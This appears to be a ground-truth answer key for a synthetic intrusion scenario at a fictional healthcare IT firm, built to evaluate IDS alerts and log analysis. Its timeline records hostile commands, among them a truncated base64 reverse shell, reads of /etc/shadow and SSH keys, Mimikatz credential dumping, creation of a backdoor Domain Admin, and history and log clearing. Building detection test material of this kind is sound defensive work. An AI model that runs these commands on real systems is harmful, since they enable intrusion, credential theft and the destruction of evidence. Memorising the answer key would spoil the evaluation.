# Ground Truth: iteration-test-expanded-ids

**Scenario:** IDS-focused variant of the expanded EvidenceForge iteration-test scenario for fast
generate/evaluate/fix cycles. It preserves the original environment and attack narrative
while adding authored, transport-correlated IDS assertions, sensor-local filtering, and
deliberate no-alert cases for broad automated and LLM-as-a-judge quality evaluation.
Meridian Healthcare Solutions is a mid-size healthcare IT company providing EHR
integration services from a corporate HQ with an on-premises data center. The
storyline compresses an APT-style web-app intrusion, Linux and Windows lateral
movement, credential theft, domain compromise, C2, DNS tunneling, data staging,
exfiltration, email abuse, and cleanup into a 6-hour collection window while
preserving broad event-type and log-format coverage. This expanded variant adds
explicit on-prem email topology, SMTP routing, corpus-backed message bodies,
MIME artifacts, distribution groups, Bcc handling, STARTTLS visibility, ISP relay
egress, inbound/outbound/internal mail, explicit mailbox reads, rejected mail,
and deterministic background email traffic.


**Generated:** 2024-03-18 12:00:00 UTC


## Attack Summary

This scenario simulates the following attack sequence:

1. **diego.ramirez** on **WS-DRAMIREZ-01**: External benefits-themed phishing message is delivered to Finance with hidden security Bcc
2. **diego.ramirez** on **WS-DRAMIREZ-01**: Finance user reads the suspicious benefits message through OWA
3. **diego.ramirez** on **WS-DRAMIREZ-01**: Diego forwards the suspicious message to the help desk and discreetly copies security
4. **root** on **WEB-EXT-01**: External attacker scans the DMZ for exposed services
5. **root** on **WEB-EXT-01**: External attacker runs Nikto web vulnerability scanning against the EHR portal
6. **root** on **LT-MRIVERA-02**: Rogue laptop obtains an address from DHCP on the corporate LAN
7. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an internal EHR release note to a clinical operations distribution group
8. **omar.haddad** on **WS-OHADDAD-01**: Analytics user reads the EHR release note through IMAPS
9. **apache** on **WEB-EXT-01**: SQL injection probes against the EHR portal produce server errors
10. **apache** on **WEB-EXT-01**: Web shell upload and reverse shell callback to direct-IP C2
11. **root** on **WEB-EXT-01**: Network and host discovery from the compromised web server
12. **priya.patel** on **WS-PPATEL-01**: A vendor document workflow sends security an AI-generated summary with prompt-injection text in an attachment
13. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an outbound interface package to a lab vendor through the clinical route and ISP relay
14. **root** on **WEB-EXT-01**: Harvest database credentials and SSH key material from the web server
15. **root** on **APP-INT-01**: Failed SSH attempt to PROXY-01 followed by successful SSH lateral movement to APP-INT-01
16. **root** on **APP-INT-01**: Dump Linux password databases from APP-INT-01
17. **marcus.chen** on **WS-MCHEN-01**: Attacker uses explicit sysadmin credentials through RunAs
18. **root** on **LT-MRIVERA-02**: Wrong-password fumble before broader credential spray
19. **root** on **WS-AJOHNSON-01**: Credential spray succeeds against help desk user followed by RDP session
20. **aisha.johnson** on **WS-AJOHNSON-01**: Compromised help desk mailbox sends an internal credential-reset lure to finance
21. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker reads the compromised help desk mailbox through IMAPS
22. **aisha.johnson** on **WS-AJOHNSON-01**: Active Directory enumeration from compromised workstation
23. **aisha.johnson** on **WS-AJOHNSON-01**: Credential dumping with Mimikatz disguised as a Windows indexing service
24. **aisha.johnson** on **DC-01**: PsExec-style lateral movement to DC-01 through SMB service creation
25. **evelyn.brooks** on **WS-EBROOKS-01**: External invoice-themed attachment is rejected by the mail gateway
26. **SYSTEM** on **DC-01**: Create backdoor account and add it to Domain Admins
27. **SYSTEM** on **DC-01**: Install service and scheduled task persistence on DC-01
28. **SYSTEM** on **DC-01**: Allowed HTTPS beacon from DC-01 to attacker infrastructure
29. **SYSTEM** on **DC-01**: Direct C2 beacon attempts from DC-01 are blocked by firewall
30. **root** on **APP-INT-01**: DNS tunneling exfiltration from APP-INT-01
31. **evelyn.brooks** on **WS-EBROOKS-01**: Executive sends an inline-authored operating note to an outside advisor with internal Bcc
32. **root** on **WEB-EXT-01**: DGA queries from compromised web server
33. **svc_mhsync** on **FILE-SRV-01**: Backdoor account authenticates to FILE-SRV-01 and stages sensitive data
34. **root** on **DB-PROD-01**: SSH to DB-PROD-01, dump patient database, gzip, and SCP archive back to APP-INT-01
35. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker locks compromised workstation before stepping away
36. **aisha.johnson** on **WS-AJOHNSON-01**: Upload compressed archive to external staging domain over HTTPS
37. **root** on **WEB-EXT-01**: Ongoing periodic beacon from WEB-EXT-01
38. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker returns and unlocks compromised workstation
39. **root** on **WEB-EXT-01**: Clear Linux shell history on WEB-EXT-01
40. **root** on **APP-INT-01**: Clear Linux shell history on APP-INT-01
41. **SYSTEM** on **DC-01**: Encoded PowerShell download and Security log clearing on DC-01
42. **root** on **APP-INT-01**: Standalone DNS queries for attacker infrastructure
43. **SYSTEM** on **DC-01**: Delete backdoor account after exfiltration
44. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker logs off compromised help desk workstation
45. **svc_mhsync** on **FILE-SRV-01**: Backdoor account session logs off FILE-SRV-01
46. **root** on **APP-INT-01**: Root SSH session logs off APP-INT-01


## Timeline

| Timestamp | Actor | System | Event Type | Details |
|-----------|-------|--------|------------|---------|
| 2024-03-18 12:11:31 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: notices@benefits-serviceportal.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Benefits confirmation required today' (artifacts/email/benefits-confirmation-msg.eml) |
| 2024-03-18 12:18:11 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Read | Mailbox read: diego.ramirez@meridianhcs.com via owa on finance (UID: CZsjoOUdK9exz9bv4Y) |
| 2024-03-18 12:24:09 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: diego.ramirez@meridianhcs.com -> aisha.johnson@meridianhcs.com, marcus.chen@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Fwd: Benefits confirmation required today' (artifacts/email/finance-forward-to-it-msg.eml) |
| 2024-03-18 12:30:12 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [22], 1 denied connections + ASA threat detection alert (733100) [IDS: SID 2002911 policy={'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=0 emitted=0 filtered=0] |
| 2024-03-18 12:30:12 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [80, 443, 8080, 8443, 3306], 5 denied connections + ASA threat detection alert (733100) |
| 2024-03-18 12:30:39 UTC | root | WEB-EXT-01 | Web_Scan | Web scan (nikto) against 10.10.3.10:443 (354 requests) |
| 2024-03-18 12:44:34 UTC | root | LT-MRIVERA-02 | Dhcp_Lease | DHCP lease for LT-MRIVERA-02 (MAC: DC:A6:32:44:91:7B) |
| 2024-03-18 12:48:21 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> lina.nguyen@meridianhcs.com, omar.haddad@meridianhcs.com, priya.patel@meridianhcs.com; subject 'EHR connector release notes' (artifacts/email/ehr-release-note-msg.eml) |
| 2024-03-18 12:53:24 UTC | omar.haddad | WS-OHADDAD-01 | Email_Read | Mailbox read: omar.haddad@meridianhcs.com via imaps on clinical (UID: CqGF1yqqoxTymD2J8f) |
| 2024-03-18 13:00:18 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CCdoTsF6WH8WV7fkC) |
| 2024-03-18 13:00:20 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CamMtCknBEmJm6mkZkn) |
| 2024-03-18 13:19:54 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CQT0ZqFh6PowKFwBLA) |
| 2024-03-18 13:19:55 UTC | apache | WEB-EXT-01 | Connection | Connection to 45.33.32.30:8443 (UID: CwPRZFmrIzWuhg4qDg) |
| 2024-03-18 13:19:55 UTC | apache | WEB-EXT-01 | Process | Process: /bin/bash (PID: 581411) - `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L...` |
| 2024-03-18 13:19:56 UTC | apache | WEB-EXT-01 | Raw | Web shell upload and reverse shell callback to direct-IP C2 |
| 2024-03-18 13:39:50 UTC | root | WEB-EXT-01 | Process | Process: /usr/sbin/ip (PID: 584307) - `ip addr show` |
| 2024-03-18 13:39:55 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 584354) - `cat /etc/hosts` |
| 2024-03-18 13:40:11 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 584378) - `cat /etc/resolv.conf` |
| 2024-03-18 13:40:22 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/find (PID: 584709) - `find /opt/ehr -name '*credential*' -maxdepth 3` |
| 2024-03-18 13:42:47 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 584739) - `nmap -sn 10.10.2.0/24` |
| 2024-03-18 13:43:04 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 584811) - `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24` |
| 2024-03-18 13:49:52 UTC | priya.patel | WS-PPATEL-01 | Email_Message | Email delivered: workspace@docflow-health.net -> priya.patel@meridianhcs.com; subject 'DocFlow summary package: vendor terms' (artifacts/email/docflow-ai-summary-msg.eml) |
| 2024-03-18 13:56:07 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> miles.avery@stonebridge-consultingllc.com, omar.haddad@meridianhcs.com; subject 'Stonebridge interface package comments' (artifacts/email/vendor-interface-package-msg.eml) |
| 2024-03-18 13:59:47 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587113) - `cat /var/www/html/config.php` |
| 2024-03-18 13:59:51 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/ls (PID: 587441) - `ls -la /root/.ssh` |
| 2024-03-18 14:02:52 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587577) - `cat /root/.ssh/id_rsa` |
| 2024-03-18 14:15:00 UTC | root | APP-INT-01 | Connection | Connection to 10.10.3.20:22 (UID: CxzU5RfCk8gWEebUq3D) |
| 2024-03-18 14:15:10 UTC | root | APP-INT-01 | Ssh_Session | SSH session to 10.10.2.30:22 (UID: CzRBxFAV01DmKt4Awm) [IDS: SID 2002911 policy={'detection_filter': None, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=2 emitted=2 filtered=0] |
| 2024-03-18 14:35:26 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962186) - `cat /etc/passwd` |
| 2024-03-18 14:35:31 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962201) - `cat /etc/shadow` |
| 2024-03-18 14:49:43 UTC | marcus.chen | WS-MCHEN-01 | Explicit_Credentials | Explicit credentials: RunAs marcus.chen on DC-01 |
| 2024-03-18 14:58:42 UTC | root | LT-MRIVERA-02 | Failed_Logon | Wrong-password fumble before broader credential spray |
| 2024-03-18 15:00:18 UTC | root | WS-AJOHNSON-01 | Credential_Spray | Credential spray: 4 attempts against 3 accounts (success: aisha.johnson at attempt 4) |
| 2024-03-18 15:00:29 UTC | aisha.johnson | WS-AJOHNSON-01 | Rdp_Session | RDP session to 10.10.1.35:3389 (UID: CZUKGfLpi7WDDlc8K2K) |
| 2024-03-18 15:07:49 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Message | Email delivered: aisha.johnson@meridianhcs.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, marcus.chen@meridianhcs.com; subject 'Help desk follow-up: credential reset validation' (artifacts/email/internal-reset-lure-msg.eml) |
| 2024-03-18 15:14:07 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Read | Mailbox read: aisha.johnson@meridianhcs.com via imaps on edge (UID: CO8xuwByrKLP6Tii3t) |
| 2024-03-18 15:19:57 UTC | aisha.johnson | WS-AJOHNSON-01 | Logon | Network logon from 10.10.1.99 (LogonID: 0x2700586) |
| 2024-03-18 15:19:58 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\whoami.exe (PID: 6224) - `whoami /all` |
| 2024-03-18 15:20:01 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6288) - `net user /domain` |
| 2024-03-18 15:20:03 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6292) - `net group "Domain Admins" /domain` |
| 2024-03-18 15:20:05 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6312) - `net view /domain` |
| 2024-03-18 15:20:06 UTC | aisha.johnson | WS-AJOHNSON-01 | Dns_Query | DNS query: DC-01.meridianhcs.local (A, NOERROR) |
| 2024-03-18 15:20:07 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 10.10.2.10:389 (UID: Cy6zDvfyY3ZUtu6pru) |
| 2024-03-18 15:45:18 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\ms-index-service.exe (PID: 6316) - `ms-index-service.exe "privilege::debug" "sekurl...` |
| 2024-03-18 15:45:27 UTC | aisha.johnson | WS-AJOHNSON-01 | Process_Access | Credential dumping with Mimikatz disguised as a Windows indexing service |
| 2024-03-18 15:45:28 UTC | aisha.johnson | WS-AJOHNSON-01 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2024-03-18 15:59:34 UTC | aisha.johnson | DC-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0x5552ebd) |
| 2024-03-18 15:59:36 UTC | aisha.johnson | DC-01 | Service_Installed | Service installed: PSEXESVC (%SystemRoot%\PSEXESVC.exe) |
| 2024-03-18 15:59:37 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\PSEXESVC.exe (PID: 5424) - `PSEXESVC.exe -accepteula` |
| 2024-03-18 15:59:47 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 5428) - `cmd.exe /c whoami && hostname` |
| 2024-03-18 16:06:56 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email rejected: billing@medclaims-processing.net -> evelyn.brooks@meridianhcs.com; subject 'Updated claims processing invoice' (metadata-only) |
| 2024-03-18 16:15:07 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5472) - `net user svc_mhsync MhsSvc!2024 /add /domain` |
| 2024-03-18 16:15:08 UTC | SYSTEM | DC-01 | Account_Created | Account created: svc_mhsync |
| 2024-03-18 16:15:11 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5492) - `net group "Domain Admins" svc_mhsync /add /domain` |
| 2024-03-18 16:15:13 UTC | SYSTEM | DC-01 | Group_Member_Added | Added svc_mhsync to group Domain Admins |
| 2024-03-18 16:20:01 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 5512) - `sc.exe create DeviceSyncSvc binPath= C:\Windows...` |
| 2024-03-18 16:20:02 UTC | SYSTEM | DC-01 | Service_Installed | Service installed: DeviceSyncSvc (C:\Windows\System32\DeviceSyncSvc.exe) |
| 2024-03-18 16:20:05 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 5560) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2024-03-18 16:20:06 UTC | SYSTEM | DC-01 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\DeviceSync |
| 2024-03-18 16:30:10 UTC | SYSTEM | DC-01 | Beacon | Beacon to 45.33.32.30:443 (10 attempts, 1h30m) |
| 2024-03-18 16:30:55 UTC | SYSTEM | DC-01 | Beacon | Denied beacon to 45.33.32.30:443 (4 attempts, 1h30m) |
| 2024-03-18 16:44:53 UTC | root | APP-INT-01 | Dns_Tunnel | DNS tunnel via ns1.westbridge-services.cloud (hex, 286 queries, 1491 bytes exfiltrated) [IDS: SID 2029706 policy={'detection_filter': {'track': 'by_src', 'count': 10, 'seconds': 60}, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 2, 'seconds': 300}} candidates=286 emitted=6 filtered=280] |
| 2024-03-18 16:50:04 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email delivered: evelyn.brooks@meridianhcs.com -> marina.holt@northbridge-advisory.com, diego.ramirez@meridianhcs.com, priya.patel@meridianhcs.com; subject 'March operating note' (artifacts/email/executive-operating-note-msg.eml) |
| 2024-03-18 17:00:27 UTC | root | WEB-EXT-01 | Dga_Queries | DGA queries: 91 total (80 NXDOMAIN, TLD: .top, sample: ['ewnjsaqf1rasgez5.top', '6cja6syvo02mu.top', '30rgw6r7503.top']) [IDS: SID 2027865 policy={'detection_filter': {'track': 'by_src', 'count': 2, 'seconds': 120}, 'event_filter': {'type': 'both', 'track': 'by_src', 'count': 1, 'seconds': 300}} candidates=182 emitted=18 filtered=164] |
| 2024-03-18 17:00:55 UTC | svc_mhsync | FILE-SRV-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0xf884a58) |
| 2024-03-18 17:00:57 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5744) - `net view \\FILE-SRV-01` |
| 2024-03-18 17:00:58 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 5760) - `powershell.exe -NoProfile -Command "Compress-Ar...` |
| 2024-03-18 17:14:43 UTC | root | DB-PROD-01 | Ssh_Session | SSH session to 10.10.4.10:22 (UID: CxdA0SDagIagfjG4J) |
| 2024-03-18 17:14:45 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/mysqldump (PID: 158973) - `mysqldump --single-transaction ehr patients ins...` |
| 2024-03-18 17:19:43 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Lock | Workstation Locked |
| 2024-03-18 17:20:17 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/gzip (PID: 159754) - `gzip -9 /tmp/rpt_0318.sql` |
| 2024-03-18 17:24:36 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/scp (PID: 160674) - `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/....` |
| 2024-03-18 17:24:58 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 45.33.32.30:443 (UID: Cn2EcgMO6PrOvSgVuH) |
| 2024-03-18 17:30:23 UTC | root | WEB-EXT-01 | Beacon | Beacon to 45.33.32.30:443 (3 attempts, count=3) |
| 2024-03-18 17:35:14 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Unlock | Workstation Unlocked |
| 2024-03-18 17:40:28 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/shred (PID: 608824) - `shred -u /root/.bash_history` |
| 2024-03-18 17:41:23 UTC | root | APP-INT-01 | Process | Process: /bin/bash (PID: 982902) - `history -c && cat /dev/null > ~/.bash_history` |
| 2024-03-18 17:41:52 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 5856) - `powershell.exe -NoProfile -EncodedCommand SQBFA...` |
| 2024-03-18 17:41:52 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 5876) - `wevtutil cl Security` |
| 2024-03-18 17:41:53 UTC | SYSTEM | DC-01 | Log_Cleared | Encoded PowerShell download and Security log clearing on DC-01 |
| 2024-03-18 17:45:03 UTC | root | APP-INT-01 | Dns_Query | DNS query: edge.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:45:04 UTC | root | APP-INT-01 | Dns_Query | DNS query: api.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:45:05 UTC | root | APP-INT-01 | Dns_Query | DNS query: metrics.westbridge-services.net (TXT, NXDOMAIN) |
| 2024-03-18 17:49:41 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5884) - `net user svc_mhsync /delete /domain` |
| 2024-03-18 17:49:43 UTC | SYSTEM | DC-01 | Account_Deleted | Account deleted: svc_mhsync |
| 2024-03-18 17:55:24 UTC | aisha.johnson | WS-AJOHNSON-01 | Logoff | Attacker logs off compromised help desk workstation |
| 2024-03-18 17:56:06 UTC | svc_mhsync | FILE-SRV-01 | Logoff | Backdoor account session logs off FILE-SRV-01 |
| 2024-03-18 17:57:14 UTC | root | APP-INT-01 | Logoff | Root SSH session logs off APP-INT-01 |


## Source Evidence Status

Canonical ground truth remains authoritative. Source rows may be `visible`, `delayed`, `dropped`, `filtered`, or `out_of_window` depending on the selected observation profile and sensor placement.

| Storyline ID | Source | Status Counts |
|--------------|--------|---------------|
| 05c605ce-8092-44d0-b3b5-6427c01ccca4 | ids | delayed: 1 |
| 0671310b-630f-4913-a2c4-afd592600d4c | ids | delayed: 1 |
| 0bcafef7-3337-4c45-b1fc-7daf59ca783b | ids | delayed: 1 |
| 0d48c956-f1ca-4266-afd2-7b7298f267ec | ids | delayed: 2 |
| 0e274941-738d-4b87-a4bf-fe631ee91df9 | ids | delayed: 1 |
| 10cd5423-71c8-48c3-b037-0b8417fa944f | ids | delayed: 1 |
| 112be276-d540-40eb-8201-01fa7dac21e7 | ids | delayed: 1 |
| 113a4ffa-5876-40bd-bb74-55a36ba1a233 | ids | delayed: 1 |
| 15295a1c-220e-4b7c-8e5d-d642c38725ea | ids | delayed: 1 |
| 1b20ce99-d665-4c49-9c67-aa7dbc2dedf0 | ids | delayed: 1 |
| 1b218dd1-8463-4471-a0e2-7406e5ed9c8e | ids | delayed: 1 |
| 1e2c6ecf-fe69-4202-ab1f-9675fe12ed88 | ids | delayed: 1 |
| 1fbe02fa-8ed1-4ac6-9de4-c6db23790c3e | ids | delayed: 1 |
| 23d05f37-47cb-4e3f-be26-08d2752f3c34 | ids | delayed: 1 |
| 27f9d534-1121-45fc-8560-4918c262f237 | ids | delayed: 1 |
| 33898107-8e3e-476e-adb5-b43350152f20 | ids | delayed: 2 |
| 3586a2c1-7003-4001-97c0-8c55275ed30d | ids | delayed: 1 |
| 399de80e-5b51-4b3a-be6b-ce7b62496c77 | ids | delayed: 1 |
| 3b1ad587-573a-40cd-b568-77be55249bb0 | ids | visible: 1 |
| 3c366d54-97d2-4a09-8bbe-06ebb249c2e2 | ids | visible: 1 |
| 3e59d939-029a-472b-a1b0-a7cf96c9c9b4 | ids | delayed: 1 |
| 3f023b73-890e-40ac-840f-0b5ca1c0107e | ids | delayed: 1 |
| 40dfd4ed-08ff-4779-b05a-91d48a8fc7f2 | ids | delayed: 1 |
| 42165144-6e77-4930-9cb2-ee65b079a480 | ids | delayed: 2 |
| 43401d19-d4a4-4be0-b9b2-9f251a85e66d | ids | delayed: 1 |
| 43451c02-ebe2-4298-9870-ccd8bf7b3352 | ids | delayed: 1 |
| 4448c969-98e0-44d8-891a-f0fe01e33566 | ids | delayed: 1 |
| 4761025d-1f97-4f6b-8430-cb55e3be5fc2 | ids | delayed: 1 |
| 48cdbc03-edd0-476c-9af9-2478fc726745 | ids | delayed: 1 |
| 4e9e4fff-88c5-4700-b6b7-a47ae4a2301b | ids | delayed: 1 |
| 50f84440-6e62-4a44-8e40-7ac75a2572f0 | ids | delayed: 1 |
| 5121224e-0b4d-4275-8d3e-19354429fa4c | ids | delayed: 1 |
| 53e05d83-379f-46aa-b6a9-32b917a2f952 | ids | delayed: 1 |
| 5420fb4a-4c3e-4a21-957a-4c742315bed8 | ids | visible: 1 |
| 54bff7d9-71f2-4508-9a9f-cda9c4ef74e0 | ids | delayed: 2 |
| 55a33b6e-916f-4477-8a0d-163728179107 | ids | delayed: 2 |
| 57089ff1-c86d-4998-ba3a-bd1b892451b6 | ids | delayed: 1 |
| 59e49896-9117-4288-9d51-280e880f933b | ids | delayed: 1 |
| 5c3ce4b9-b837-4e72-9382-679d9917825a | ids | delayed: 1 |
| 5cca4300-40b8-4bb3-bd7d-fe07d2423b4e | ids | delayed: 1 |
| 5ff43edd-d73e-489f-9f91-c5da1e1d4bfd | ids | delayed: 1 |
| 6022fe36-40e9-415e-a075-7396a731a666 | ids | delayed: 1 |
| 609c3c57-2a61-432c-bbea-bc2b52e500de | ids | delayed: 1 |
| 60fc4a79-aed4-4ee8-b17b-4da991af73d4 | ids | delayed: 1 |
| 62919f80-857c-48bb-96a5-367b687e04d7 | ids | delayed: 2 |
| 64561390-da41-442e-bcc2-e66c44c4090e | ids | delayed: 1 |
| 6502486f-01ed-43b9-ba3c-ea7265cc9d1f | ids | delayed: 1 |
| 6a0e303a-0e36-4179-b6ba-d96c3a0b553d | ids | delayed: 1 |
| 6d780e41-a112-4965-8b5f-a8c4f6260337 | ids | delayed: 1 |
| 70c59a40-0bd7-41fe-803e-359c59ac5411 | ids | delayed: 1 |
| 70c5b5e1-4485-4a6f-b754-6df2026607dc | ids | delayed: 1 |
| 72cdc5b6-4307-41d6-b305-e27de2913fc8 | ids | delayed: 2 |
| 74a18de6-200a-4c58-aa71-910c900b7ae4 | ids | delayed: 1 |
| 790e6dd4-20f2-42c1-a599-e174bf3f3a74 | ids | delayed: 2 |
| 7c9640eb-165d-498c-b5c8-3800fb63b687 | ids | delayed: 1 |
| 7cb732ae-9542-4ab3-ae4e-3dff23a94097 | ids | delayed: 1 |
| 7dc63214-c86a-4280-a1c9-51cc09e6bc4f | ids | delayed: 1 |
| 80b76e14-c465-4ac1-9cf5-b220c9540999 | ids | delayed: 2 |
| 8f03b403-277e-4387-a66f-a42c7722d6d2 | ids | delayed: 1 |
| 907cb1d3-54ca-431e-b325-8eba08f64e9d | ids | delayed: 1 |
| 93e0d2c5-3790-4b6e-9234-6aca97932251 | ids | delayed: 1 |
| 95c76adb-4906-4d1a-83d4-2c809ac55b6c | ids | delayed: 2 |
| 967311bd-924e-49ce-8ce1-fa321b50909a | ids | delayed: 1 |
| 9a66f8c9-b41c-44ca-9d41-cbd81ba7dff0 | ids | delayed: 1 |
| 9b5c044e-e9fb-4b73-8af3-066f279225e9 | ids | delayed: 1 |
| 9c670ec6-0405-42c6-b37a-4d324cb34264 | ids | delayed: 1 |
| 9dbd7522-74b7-4166-ab79-38f0755fe5a6 | ids | delayed: 1 |
| a2bfa269-fa99-42bc-b042-643f186a3de8 | ids | delayed: 1 |
| a4b3329c-46e9-450d-9f74-8d4a8d0d483b | ids | delayed: 1 |
| a78051a8-eb9b-4f38-a644-4dcdeea78d52 | ids | delayed: 1 |
| aafc14d3-6458-4316-b9ea-c45ba545f788 | ids | delayed: 1 |
| aba3bb86-565c-4add-b6e3-d0da103b887c | ids | delayed: 1 |
| b330d06c-8090-43b9-a6c6-c7c68be67296 | ids | delayed: 1 |
| b477af64-edf8-4721-9887-8f9b791b74da | ids | delayed: 1 |
| b49906a7-ccd5-4ddd-b0ad-d529f3b8278f | ids | delayed: 1 |
| bc443601-978d-4ee1-974f-28b9e0abe492 | ids | delayed: 1 |
| bde89d71-cd9f-4982-95ee-5f550ba86294 | ids | delayed: 1 |
| c3d9cc03-fadc-4ac1-b1a4-0bab18e1bd78 | ids | delayed: 1 |
| c7dec52e-b3f4-4cc2-b781-330604c4a831 | ids | delayed: 2 |
| cb0f5470-5aa7-40ed-ae51-3cb4e0cb4a9c | ids | delayed: 1 |
| d08d1d13-9e09-415b-a5ea-5e82fb888de1 | ids | delayed: 1 |
| d71b05c8-d02c-4d6a-b6c3-d5eeec47ebb6 | ids | delayed: 1 |
| d778c52e-86f1-4071-97ca-26521f08cb53 | ids | delayed: 1 |
| d7b4f2c7-8f54-4f95-9308-9f86aff80a47 | ids | delayed: 2 |
| d7c83737-23e5-4c33-ad41-5ce710d98fda | ids | delayed: 1 |
| da4dcaa5-c960-425f-9e70-3b59218ec658 | ids | delayed: 1 |
| e12f3976-63a0-4962-ac14-ee791ff4c573 | ids | delayed: 1 |
| e1e043cd-c937-4b06-9458-f8d9e84d3b82 | ids | delayed: 1 |
| e26cc70d-205f-4d2e-ba5e-355ee160c17f | ids | delayed: 1 |
| e2779f8d-2ec4-4b7a-bb49-78063458bdd3 | ids | delayed: 1 |
| e27b8316-1274-42c2-b9a0-1ce8381c6290 | ids | delayed: 1 |
| e600c9b3-5fee-492b-ac85-f439847fb8f9 | ids | delayed: 1 |
| e8dbc68a-6432-497e-9206-df6252d41d10 | ids | delayed: 1 |
| ea49d373-d13f-4d39-a3b4-fe8d674f4725 | ids | delayed: 1 |
| eabfed27-a185-44aa-b253-a62ac7c602b5 | ids | delayed: 1 |
| eb263b1c-61fc-473b-9662-cb5f5fb7da30 | ids | visible: 1 |
| ed22ad41-3d68-4c84-9ac2-aa44344c3a05 | ids | delayed: 1 |
| ed825130-2038-487e-a887-49c3e66c5cfd | ids | delayed: 1 |
| ee698031-15fd-4afe-ad3b-f4ad0f16347b | ids | delayed: 1 |
| ef09b7eb-8b0e-4462-9393-25111b8726c1 | ids | delayed: 1 |
| evt-001 | asa | delayed: 6 |
| evt-001 | ecar | delayed: 2 |
| evt-001 | ids | filtered: 1 |
| evt-001 | zeek | delayed: 1, filtered: 4, visible: 1 |
| evt-002 | asa | delayed: 348, dropped: 1, filtered: 1, visible: 4 |
| evt-002 | ecar | delayed: 352, dropped: 2 |
| evt-002 | ids | delayed: 13 |
| evt-002 | web | delayed: 309 |
| evt-002 | zeek | delayed: 501, dropped: 2, filtered: 2, visible: 159 |
| evt-003 | syslog | delayed: 3 |
| evt-003 | zeek | delayed: 2 |
| evt-004 | asa | delayed: 2 |
| evt-004 | ecar | delayed: 2 |
| evt-004 | web | delayed: 2 |
| evt-004 | zeek | delayed: 4 |
| evt-005 | asa | delayed: 2 |
